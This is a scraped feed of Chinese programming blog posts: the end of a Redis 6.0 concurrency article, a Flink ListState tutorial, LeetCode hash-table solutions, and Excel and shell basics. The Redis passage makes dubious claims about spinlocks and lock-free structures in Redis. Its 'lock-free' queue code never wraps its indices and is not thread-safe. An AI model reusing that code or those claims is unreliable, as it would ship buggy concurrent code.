使用了简单的锁机制来保护关键区域，确保在某个时刻只有一个线程能够访问特定资源。此外，Redis 内部使用的很多操作（如增量计数器）都是原子操作，能够在并发环境中保证操作的安全性。原子操作示例Redis 中使用的原子操作，通常通过操作系统提供的底层原子函数实现。在 C 语言中，可以使用 __sync_fetch_and_add 等 GCC 内置函数来实现原子加法。例如：// 原子加法示例#include&lt;stdio.h&gt;volatileintcounter=0;voidincrement_counter(){// 使用 GCC 内置的原子加法__sync_fetch_and_add(&amp;counter,1);}intmain(){increment_counter();printf("Counter: %d\n",counter);return0;}在上述代码中，__sync_fetch_and_add 函数可以确保在多线程环境中对 counter 的增量操作是原子的。锁的实现Redis 使用自旋锁来保护临界区。以下是一个简单的自旋锁的实现示例：typedefstruct{volatileintlocked;// 锁状态}spinlock_t;voidspinlock_init(spinlock_t*lock){lock-&gt;locked=0;// 初始化为未锁定}voidspinlock_lock(spinlock_t*lock){while(__sync_lock_test_and_set(&amp;lock-&gt;locked,1)){// 自旋等待}}voidspinlock_unlock(spinlock_t*lock){__sync_lock_release(&amp;lock-&gt;locked);}在这个自旋锁的实现中，spinlock_lock 使用 __sync_lock_test_and_set 来获取锁并保证原子性。4.细粒度锁在某些情况下，Redis 可以使用细粒度锁（例如，针对特定数据结构的锁）来实现更高效的并发控制。这种方式相比于全局锁能够提高并发性能，因为它允许多个线程同时操作不同的资源。细粒度锁允许多个线程并行访问不同的资源，以下是细粒度锁的伪代码示例：// 细粒度锁结构typedefstruct{spinlock_tlock;// 细粒度锁// 资源}resource_t;// 访问资源的函数voidaccess_resource(resource_t*res){spinlock_lock(&amp;res-&gt;lock);// 获取细粒度锁// 处理资源spinlock_unlock(&amp;res-&gt;lock);// 释放细粒度锁}在这个示例中，每个资源都有一个细粒度锁，允许不同的线程同时访问不同的资源而不会互相影响。5.无锁设计Redis 中的一些数据结构（如字典、列表等）采用了无锁设计，使用原子操作来保证数据的一致性。这种设计能避免使用传统的锁机制，从而提高性能。无锁设计通常依赖于原子操作，允许多个线程在不使用传统锁的情况下安全地访问共享资源。以下是一个无锁队列的简化示例：typedefstruct{int*buffer;volatileinthead;volatileinttail;intcapacity;}lock_free_queue;// 入队操作intenqueue(lock_free_queue*queue,intvalue){inttail=queue-&gt;tail;intnext_tail=(tail+1)%queue-&gt;capacity;if(next_tail==queue-&gt;head){// 队列满return-1;}queue-&gt;buffer[tail]=value;__sync_fetch_and_add(&amp;queue-&gt;tail,1);// 原子更新尾部return0;}// 出队操作intdequeue(lock_free_queue*queue,int*value){inthead=queue-&gt;head;if(head==queue-&gt;tail){// 队列空return-1;}*value=queue-&gt;buffer[head];__sync_fetch_and_add(&amp;queue-&gt;head,1);// 原子更新头部return0;}在这个无锁队列的实现中，enqueue 和 dequeue 操作使用原子操作来更新头和尾的索引，而不需要传统的锁机制。这样可以减少线程间的争用，提高性能。6.复制和分区Redis 的集群架构通过数据分区和复制来扩展性能和可用性。每个分片可以在单独的线程中处理请求，分担整体的负载，且数据一致性通过主从复制机制得到保障。总结引入多线程后的 Redis 6.0 通过将数据操作保持在单线程中、使用锁和原子操作、细粒度锁、无锁设计等多种方式来解决并发带来的线程安全问题。这种设计既能提升性能，又能保证数据的一致性和安全性。http://www.ppmy.cn/news/1540919.html相关文章Flink算子状态为何只能用ListState？前言 
Flink 将状态是否要按照 key 进行分类&amp;#xff0c;将状态分为键值状态&amp;#xff08;Keyed State&amp;#xff09;和算子状态&amp;#xff08;Operator State&amp;#xff09;两种&amp;#xff0c;两者除了状态本身的作用域不同外&amp;#xff0c;其中算子状态的状态类型更是被 Flink 限制为 Li…阅读更多...算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和刷题记录 242. 有效的字母异位词349. 两个数组的交集202. 快乐数1. 两数之和 242. 有效的字母异位词 
leetcode题目地址 
简单题&amp;#xff0c;哈希表。数组长度为常量&amp;#xff0c;因此空间复杂度为O(1)。 
时间复杂度&amp;#xff1a;  O ( n ) O(n) O(n) 空间复杂度&amp;#xff1a;  O…阅读更多...# Excel 操作大全Excel 操作大全 文章目录 Excel 操作大全单元格文本换行计算SUM 单元格 
文本换行 
设置自动换行&amp;#xff0c;在文本前面使用 AltEnter键即可换行文本前面可以输入空格实现段前缩进的效果  
计算SUM 
求和函数阅读更多...Linux——shell 编程基础基本介绍 shell 变量 环境变量&amp;#xff08;也叫全局变量&amp;#xff09; 位置参数变量 预定义变量 运算符 条件判断 流程控制 
if 单分支&amp;多分支 case 语句 for循环 while 循环 read 读取控制台输入 函数 
系统函数 
basename 获取文件名 
dirname 获取目录路径 
自定义函数 综…阅读更多...WebSocket Secure (WSS)使用代理浏览器时&amp;#xff0c;WebSocket Secure (WSS) 链接失败可能由以下原因引起&amp;#xff1a; 代理设置问题&amp;#xff1a; 确保代理配置正确&amp;#xff0c;包括代理地址和端口。有些代理服务器不支持WebSocket连接&amp;#xff0c;您需要确认您的代理服务是否支持WSS。 SSL/TLS 问题…阅读更多...用动态IP软件改变IP地址：探索原理与实用指南‌在数字时代&amp;#xff0c;网络的普及让我们的生活与工作更加便捷&amp;#xff0c;但同时也带来了一系列新的挑战。地域限制、反爬虫机制等问题逐渐凸显&amp;#xff0c;成为了许多网络用户和企业在享受网络便利时必须面对的难题。为了解决这些问题&amp;#xff0c;动态IP软件应运而生&amp;#xf…阅读更多...数据库权限提升GetShell数据库提权总结 - 随风kali - 博客园 (cnblogs.com) 
MySQL 漏洞利用与提权 | 国光 (sqlsec.com) 
sql注入getshell的几种方式 
第99天&amp;#xff1a;权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF 
SQL注入拿shell的方式应该是通用的得到连接数据库…阅读更多...每日一题——第一百一十八题题目&amp;#xff1a;进制转换合集 
#pragma once
#include&lt;stdio.h&gt;
#include&lt;ctype.h&gt;
#include&lt;stdbool.h&gt;
#include&lt;string&gt;/// &lt;summary&gt;
/// 将字符串表示的任意进制数转为十进制
/// &lt;/summary&gt;
/// &lt;param name"str"&gt;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:35 +0000</pubDate>
    </item>
    <item>
      <title>Flink算子状态为何只能用ListState？</title>
      <link>https://www.ppmy.cn/news/1540918.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Flink算子状态为何只能用ListState？news/2025/10/31 23:19:33/前言Flink 将状态是否要按照 key 进行分类，将状态分为键值状态（Keyed State）和算子状态（Operator State）两种，两者除了状态本身的作用域不同外，其中算子状态的状态类型更是被 Flink 限制为 ListState，这是为什么呢？使用算子状态算子状态的作用域为当前 subTask，使用算子状态，Flink 算子的每个subTask只能访问当前subTask的数据，不能夸subTask访问。典型的应用场景就是 FlinkKafkaConsumer 使用算子状态保存 Kafka Topic 中的每个分区的消费偏移量。在Flink中，要想使用算子状态，可以选择实现 CheckpointedFunction 接口publicinterfaceCheckpointedFunction{voidsnapshotState(FunctionSnapshotContextvar1)throwsException;voidinitializeState(FunctionInitializationContextvar1)throwsException;}snapshotState Flink作业执行快照时调用该方法，开发者可以控制往ListState写入哪些数据initializeState Flink作业启动或者异常容错从快照恢复时调用这个方法Flink作业启动或异常恢复时会调用 CheckpointedFunction#initializeState，通过入参 FunctionInitializationContext 来获取算子状态。要想获取算子状态，首先得先定义状态描述符，因为算子状态被强制限定为列表状态，所以只能用 ListStateDescriptor。然后通过入参 FunctionInitializationContext#getOperatorStateStore 对象来获取 ListState。@OverridepublicvoidinitializeState(FunctionInitializationContextfunctionInitializationContext)throwsException{this.elementsState=functionInitializationContext.getOperatorStateStore().getListState(newListStateDescriptor&lt;&gt;("elements",Integer.class));}算子状态实战算子状态在业务场景中并不常用，除了 FlinkKafkaConsumer 使用算子状态保存 Kafka Topic 中分区的消费偏移量外，Sink 算子使用算子状态作为写出数据的缓冲区也是一个较为常用的场景。MySQL 是常用的关系型数据库，在流计算场景中，它也是一种常用的数据汇存储引擎，用来保存流计算的结果。但是MySQL的写入TPS通常不高，一般在几百甚至几千，上万已经是很夸张了。但是Flink作为一款高性能的流计算引擎，动辄十万百万的TPS数据流入，如果计算结果每次都写入MySQL，势必会压垮MySQL。此时可以在 Sink 算子上使用算子状态作为缓冲区，先缓存一部分数据，最后再一次性批量写MySQL，以此来减轻MySQL的压力。举个例子，现在有一个数据源，会源源不断的产生一批数字，现在要开发一个 Flink 作业，计算这些数字的和，然后把结果写入到 MySQL，为了减轻MySQL的写入压力，要求 Sink 算子可以缓冲一部分数据再批量写。如下代码所示，SumResultBufferingSink 实现了CheckpointedFunction 接口，元素到达时会先写入缓冲区 elements，缓冲区满才会累计求和后写入MySQL。同时，在执行快照时，也会把elements缓冲区的数据写入到elementsState，异常恢复时，再将elementsState数据恢复到缓冲区。publicclassOperatorStateFuature{publicstaticvoidmain(String[]args)throwsException{StreamExecutionEnvironmentenvironment=StreamExecutionEnvironment.getExecutionEnvironment();environment.fromElements(1,2,3,4,5,6).keyBy(i-&gt;"all").sum(0).addSink(newSumResultBufferingSink(3));environment.execute();}publicstaticclassSumResultBufferingSinkimplementsSinkFunction&lt;Integer&gt;,CheckpointedFunction{privatefinalintbufferSize;privatefinalList&lt;Integer&gt;elements;privateListState&lt;Integer&gt;elementsState;publicSumResultBufferingSink(intbufferSize){this.bufferSize=bufferSize;this.elements=newArrayList&lt;&gt;(bufferSize);}@Overridepublicvoidinvoke(Integervalue,Contextcontext)throwsException{elements.add(value);if(elements.size()&gt;=bufferSize){intsum=elements.stream().mapToInt(Integer::intValue).sum();System.err.println("write to db : sum="+sum);elements.clear();}}@OverridepublicvoidsnapshotState(FunctionSnapshotContextfunctionSnapshotContext)throwsException{System.err.println("---snapshotState start---");elementsState.clear();elementsState.addAll(elements);System.err.println("---snapshotState end---");}@OverridepublicvoidinitializeState(FunctionInitializationContextfunctionInitializationContext)throwsException{System.err.println("---initializeState start---");this.elementsState=functionInitializationContext.getOperatorStateStore().getListState(newListStateDescriptor&lt;&gt;("elements",Integer.class));// 是否从故障中恢复if(functionInitializationContext.isRestored()){Iterator&lt;Integer&gt;iterator=elementsState.get().iterator();while(iterator.hasNext()){elements.add(iterator.next());}}System.err.println("---initializeState end---");}}}使用 SumResultBufferingSink 后，缓冲区大小为3，六个元素只会写两次DB。ListState和UnionListStateOperatorStateStore 提供了两个方法获取 ListStatepublicinterfaceOperatorStateStore{&lt;S&gt;ListState&lt;S&gt;getListState(ListStateDescriptor&lt;S&gt;stateDescriptor)throwsException;&lt;S&gt;ListState&lt;S&gt;getUnionListState(ListStateDescriptor&lt;S&gt;stateDescriptor)throwsException;}ListState和UnionListState 有什么区别呢？两者的区别在于，快照恢复或者算子并行度发生改变时，算子状态值的分配方式是不同的。ListState 采用平均分割分配，状态重新分配时，所有subTask的ListState会先合并到一起，再采用 Round-Robin 策略将列表中的状态分配到各个subTaskUnionListState 采用合并分配，状态重新分配时，所有subTask的ListState合并到一起得到一个完整的列表，再将这个完整的列表发给每个subTask。Tips：UnionListState要慎用，当列表中的元素非常多时，有内存溢出的风险。算子状态为什么限制ListState回到开篇提出的问题，为什么Flink要限制算子状态只能使用 ListState 类型？本质上，是Flink异常恢复，或者算子并行度发生变化时，算子状态数据如何分配的问题。最简单公平的分配算法就是平均分配，那么除了 ListState 这种列表类型，其它如 ValueState，MapState 等数据结构实在是不方便数据划分啊，所以Flink才限制算子状态必须是 ListState 类型。当然，Flink 也给了开发者两种选择，一是 ListState 的平均分配，二是 UnionListState 给你全量的状态，程序自己来分配，更加灵活。http://www.ppmy.cn/news/1540918.html相关文章算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和刷题记录 242. 有效的字母异位词349. 两个数组的交集202. 快乐数1. 两数之和 242. 有效的字母异位词 
leetcode题目地址 
简单题&amp;#xff0c;哈希表。数组长度为常量&amp;#xff0c;因此空间复杂度为O(1)。 
时间复杂度&amp;#xff1a;  O ( n ) O(n) O(n) 空间复杂度&amp;#xff1a;  O…阅读更多...# Excel 操作大全Excel 操作大全 文章目录 Excel 操作大全单元格文本换行计算SUM 单元格 
文本换行 
设置自动换行&amp;#xff0c;在文本前面使用 AltEnter键即可换行文本前面可以输入空格实现段前缩进的效果  
计算SUM 
求和函数阅读更多...Linux——shell 编程基础基本介绍 shell 变量 环境变量&amp;#xff08;也叫全局变量&amp;#xff09; 位置参数变量 预定义变量 运算符 条件判断 流程控制 
if 单分支&amp;多分支 case 语句 for循环 while 循环 read 读取控制台输入 函数 
系统函数 
basename 获取文件名 
dirname 获取目录路径 
自定义函数 综…阅读更多...WebSocket Secure (WSS)使用代理浏览器时&amp;#xff0c;WebSocket Secure (WSS) 链接失败可能由以下原因引起&amp;#xff1a; 代理设置问题&amp;#xff1a; 确保代理配置正确&amp;#xff0c;包括代理地址和端口。有些代理服务器不支持WebSocket连接&amp;#xff0c;您需要确认您的代理服务是否支持WSS。 SSL/TLS 问题…阅读更多...用动态IP软件改变IP地址：探索原理与实用指南‌在数字时代&amp;#xff0c;网络的普及让我们的生活与工作更加便捷&amp;#xff0c;但同时也带来了一系列新的挑战。地域限制、反爬虫机制等问题逐渐凸显&amp;#xff0c;成为了许多网络用户和企业在享受网络便利时必须面对的难题。为了解决这些问题&amp;#xff0c;动态IP软件应运而生&amp;#xf…阅读更多...数据库权限提升GetShell数据库提权总结 - 随风kali - 博客园 (cnblogs.com) 
MySQL 漏洞利用与提权 | 国光 (sqlsec.com) 
sql注入getshell的几种方式 
第99天&amp;#xff1a;权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF 
SQL注入拿shell的方式应该是通用的得到连接数据库…阅读更多...每日一题——第一百一十八题题目&amp;#xff1a;进制转换合集 
#pragma once
#include&lt;stdio.h&gt;
#include&lt;ctype.h&gt;
#include&lt;stdbool.h&gt;
#include&lt;string&gt;/// &lt;summary&gt;
/// 将字符串表示的任意进制数转为十进制
/// &lt;/summary&gt;
/// &lt;param name"str"&gt;…阅读更多...全面了解 NGINX 的负载均衡算法NGINX 提供多种负载均衡方法&amp;#xff0c;以应对不同的流量分发需求。常用的算法包括&amp;#xff1a;最少连接、最短时间、通用哈希、随机算法和 IP 哈希。这些负载均衡算法都通过独立指令来定义&amp;#xff0c;每种算法都有其独特的应用场景。 以下负载均衡方法&amp;#xff08;IP 哈希除…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:34 +0000</pubDate>
    </item>
    <item>
      <title>算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和</title>
      <link>https://www.ppmy.cn/news/1540917.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维算法训练（leetcode）二刷第五天 | 242. 有效的字母异位词、349. 两个数组的交集、202. 快乐数、1. 两数之和news/2025/10/31 23:19:32/刷题记录242. 有效的字母异位词349. 两个数组的交集202. 快乐数1. 两数之和242. 有效的字母异位词leetcode题目地址简单题，哈希表。数组长度为常量，因此空间复杂度为O(1)。时间复杂度：O ( n ) O(n)O(n)空间复杂度：O ( 1 ) O(1)O(1)// javaclassSolution{publicbooleanisAnagram(Strings,Stringt){int[]hash=newint[26];for(inti=0;i&lt;s.length();i++){hash[s.charAt(i)-'a']++;}for(inti=0;i&lt;t.length();i++){hash[t.charAt(i)-'a']--;}for(inti=0;i&lt;26;i++)if(hash[i]!=0)returnfalse;returntrue;}}349. 两个数组的交集leetcode题目地址Set的使用。时间复杂度：O ( n + m ) O(n+m)O(n+m)空间复杂度：O ( n ) O(n)O(n)// javaclassSolution{publicint[]intersection(int[]nums1,int[]nums2){Set&lt;Integer&gt;hash=newHashSet&lt;&gt;();Set&lt;Integer&gt;list=newHashSet&lt;&gt;();for(inti=0;i&lt;nums1.length;i++){hash.add(nums1[i]);}for(inti=0;i&lt;nums2.length;i++){if(hash.contains(nums2[i])){list.add(nums2[i]);}}int[]res=newint[list.size()];intidx=0;for(intx:list){res[idx++]=x;}returnres;}}202. 快乐数leetcode题目地址多推几步就会发现，不是快乐数的数字经过计算会重复出现。因此借助hash表，重复出现则不是快乐数。时间复杂度：O ( n ) O(n)O(n)空间复杂度：O ( n ) O(n)O(n)// javaclassSolution{publicintcal(intn){intsum=0;while(n!=0){intx=n%10;n/=10;sum+=x*x;}returnsum;}publicbooleanisHappy(intn){Map&lt;Integer,Integer&gt;hash=newHashMap&lt;&gt;();while(n!=1){if(hash.containsKey(n))returnfalse;hash.put(n,1);n=cal(n);}returntrue;}}1. 两数之和leetcode题目地址使用map记录已访问过的元素及对应下标，判断target-当前元素的值是否已访问，若已访问直接返回。时间复杂度：O ( n ) O(n)O(n)空间复杂度：O ( n ) O(n)O(n)// javaclassSolution{publicint[]twoSum(int[]nums,inttarget){int[]res=newint[2];Map&lt;Integer,Integer&gt;hash=newHashMap&lt;&gt;();for(inti=0;i&lt;nums.length;i++){if(hash.containsKey(target-nums[i])){// return {hash.get(target-nums[i]), i};res[0]=hash.get(target-nums[i]);res[1]=i;break;}hash.put(nums[i],i);}returnres;}}http://www.ppmy.cn/news/1540917.html相关文章# Excel 操作大全Excel 操作大全 文章目录 Excel 操作大全单元格文本换行计算SUM 单元格 
文本换行 
设置自动换行&amp;#xff0c;在文本前面使用 AltEnter键即可换行文本前面可以输入空格实现段前缩进的效果  
计算SUM 
求和函数阅读更多...Linux——shell 编程基础基本介绍 shell 变量 环境变量&amp;#xff08;也叫全局变量&amp;#xff09; 位置参数变量 预定义变量 运算符 条件判断 流程控制 
if 单分支&amp;多分支 case 语句 for循环 while 循环 read 读取控制台输入 函数 
系统函数 
basename 获取文件名 
dirname 获取目录路径 
自定义函数 综…阅读更多...WebSocket Secure (WSS)使用代理浏览器时&amp;#xff0c;WebSocket Secure (WSS) 链接失败可能由以下原因引起&amp;#xff1a; 代理设置问题&amp;#xff1a; 确保代理配置正确&amp;#xff0c;包括代理地址和端口。有些代理服务器不支持WebSocket连接&amp;#xff0c;您需要确认您的代理服务是否支持WSS。 SSL/TLS 问题…阅读更多...用动态IP软件改变IP地址：探索原理与实用指南‌在数字时代&amp;#xff0c;网络的普及让我们的生活与工作更加便捷&amp;#xff0c;但同时也带来了一系列新的挑战。地域限制、反爬虫机制等问题逐渐凸显&amp;#xff0c;成为了许多网络用户和企业在享受网络便利时必须面对的难题。为了解决这些问题&amp;#xff0c;动态IP软件应运而生&amp;#xf…阅读更多...数据库权限提升GetShell数据库提权总结 - 随风kali - 博客园 (cnblogs.com) 
MySQL 漏洞利用与提权 | 国光 (sqlsec.com) 
sql注入getshell的几种方式 
第99天&amp;#xff1a;权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF 
SQL注入拿shell的方式应该是通用的得到连接数据库…阅读更多...每日一题——第一百一十八题题目&amp;#xff1a;进制转换合集 
#pragma once
#include&lt;stdio.h&gt;
#include&lt;ctype.h&gt;
#include&lt;stdbool.h&gt;
#include&lt;string&gt;/// &lt;summary&gt;
/// 将字符串表示的任意进制数转为十进制
/// &lt;/summary&gt;
/// &lt;param name"str"&gt;…阅读更多...全面了解 NGINX 的负载均衡算法NGINX 提供多种负载均衡方法&amp;#xff0c;以应对不同的流量分发需求。常用的算法包括&amp;#xff1a;最少连接、最短时间、通用哈希、随机算法和 IP 哈希。这些负载均衡算法都通过独立指令来定义&amp;#xff0c;每种算法都有其独特的应用场景。 以下负载均衡方法&amp;#xff08;IP 哈希除…阅读更多...VLMEvalKit多模态大模型评测工具源码解析vlmeval/api和vlmeval/vlm文件夹下分别是api接口和本地运行的大模型的代码 基类都是base vlmeval/dataset是数据集处理代码 vlmeval/inference.py是推理代码 run.py的整个流程 
1 vlmeval/api/base.py 
主要为需要与外部API交互的系统提供了一个通用的框架 类属性 allowed_type…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:33 +0000</pubDate>
    </item>
    <item>
      <title># Excel 操作大全</title>
      <link>https://www.ppmy.cn/news/1540916.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维# Excel 操作大全news/2025/10/31 23:19:31/Excel 操作大全文章目录Excel 操作大全单元格文本换行计算SUM单元格文本换行设置自动换行，在文本前面使用Alt+Enter键即可换行文本前面可以输入空格实现段前缩进的效果计算SUM求和函数http://www.ppmy.cn/news/1540916.html相关文章Linux——shell 编程基础基本介绍 shell 变量 环境变量&amp;#xff08;也叫全局变量&amp;#xff09; 位置参数变量 预定义变量 运算符 条件判断 流程控制 
if 单分支&amp;多分支 case 语句 for循环 while 循环 read 读取控制台输入 函数 
系统函数 
basename 获取文件名 
dirname 获取目录路径 
自定义函数 综…阅读更多...WebSocket Secure (WSS)使用代理浏览器时&amp;#xff0c;WebSocket Secure (WSS) 链接失败可能由以下原因引起&amp;#xff1a; 代理设置问题&amp;#xff1a; 确保代理配置正确&amp;#xff0c;包括代理地址和端口。有些代理服务器不支持WebSocket连接&amp;#xff0c;您需要确认您的代理服务是否支持WSS。 SSL/TLS 问题…阅读更多...用动态IP软件改变IP地址：探索原理与实用指南‌在数字时代&amp;#xff0c;网络的普及让我们的生活与工作更加便捷&amp;#xff0c;但同时也带来了一系列新的挑战。地域限制、反爬虫机制等问题逐渐凸显&amp;#xff0c;成为了许多网络用户和企业在享受网络便利时必须面对的难题。为了解决这些问题&amp;#xff0c;动态IP软件应运而生&amp;#xf…阅读更多...数据库权限提升GetShell数据库提权总结 - 随风kali - 博客园 (cnblogs.com) 
MySQL 漏洞利用与提权 | 国光 (sqlsec.com) 
sql注入getshell的几种方式 
第99天&amp;#xff1a;权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF 
SQL注入拿shell的方式应该是通用的得到连接数据库…阅读更多...每日一题——第一百一十八题题目&amp;#xff1a;进制转换合集 
#pragma once
#include&lt;stdio.h&gt;
#include&lt;ctype.h&gt;
#include&lt;stdbool.h&gt;
#include&lt;string&gt;/// &lt;summary&gt;
/// 将字符串表示的任意进制数转为十进制
/// &lt;/summary&gt;
/// &lt;param name"str"&gt;…阅读更多...全面了解 NGINX 的负载均衡算法NGINX 提供多种负载均衡方法&amp;#xff0c;以应对不同的流量分发需求。常用的算法包括&amp;#xff1a;最少连接、最短时间、通用哈希、随机算法和 IP 哈希。这些负载均衡算法都通过独立指令来定义&amp;#xff0c;每种算法都有其独特的应用场景。 以下负载均衡方法&amp;#xff08;IP 哈希除…阅读更多...VLMEvalKit多模态大模型评测工具源码解析vlmeval/api和vlmeval/vlm文件夹下分别是api接口和本地运行的大模型的代码 基类都是base vlmeval/dataset是数据集处理代码 vlmeval/inference.py是推理代码 run.py的整个流程 
1 vlmeval/api/base.py 
主要为需要与外部API交互的系统提供了一个通用的框架 类属性 allowed_type…阅读更多...Support package for Hovl Studio assets 材质转换器编辑器将仅适用于标准渲染管道的着色器替换为所有材质中的自定义管道。 编辑器只能使用Hovl Studio的资源&amp;#xff01; 此资源还包括用于URP&amp;#xff08;LWRP&amp;#xff09;和HDRP 2019.2的失真着色器以及许多有用的着色器。 
下载&amp;#xff1a;​​Unity资源商店链接资源下载链接…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:32 +0000</pubDate>
    </item>
    <item>
      <title>Linux——shell 编程基础</title>
      <link>https://www.ppmy.cn/news/1540915.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Linux——shell 编程基础news/2025/10/31 23:19:30/基本介绍shell 变量环境变量（也叫全局变量）位置参数变量预定义变量运算符条件判断流程控制if 单分支&amp;多分支case 语句for循环while 循环read 读取控制台输入函数系统函数basename 获取文件名dirname 获取目录路径自定义函数综合案例：备份数据库视频教程：备份数据库案例http://www.ppmy.cn/news/1540915.html相关文章WebSocket Secure (WSS)使用代理浏览器时&amp;#xff0c;WebSocket Secure (WSS) 链接失败可能由以下原因引起&amp;#xff1a; 代理设置问题&amp;#xff1a; 确保代理配置正确&amp;#xff0c;包括代理地址和端口。有些代理服务器不支持WebSocket连接&amp;#xff0c;您需要确认您的代理服务是否支持WSS。 SSL/TLS 问题…阅读更多...用动态IP软件改变IP地址：探索原理与实用指南‌在数字时代&amp;#xff0c;网络的普及让我们的生活与工作更加便捷&amp;#xff0c;但同时也带来了一系列新的挑战。地域限制、反爬虫机制等问题逐渐凸显&amp;#xff0c;成为了许多网络用户和企业在享受网络便利时必须面对的难题。为了解决这些问题&amp;#xff0c;动态IP软件应运而生&amp;#xf…阅读更多...数据库权限提升GetShell数据库提权总结 - 随风kali - 博客园 (cnblogs.com) 
MySQL 漏洞利用与提权 | 国光 (sqlsec.com) 
sql注入getshell的几种方式 
第99天&amp;#xff1a;权限提升-数据库提权&amp;口令获取&amp;MYSQL&amp;MSSQL&amp;Oracle&amp;MSF 
SQL注入拿shell的方式应该是通用的得到连接数据库…阅读更多...每日一题——第一百一十八题题目&amp;#xff1a;进制转换合集 
#pragma once
#include&lt;stdio.h&gt;
#include&lt;ctype.h&gt;
#include&lt;stdbool.h&gt;
#include&lt;string&gt;/// &lt;summary&gt;
/// 将字符串表示的任意进制数转为十进制
/// &lt;/summary&gt;
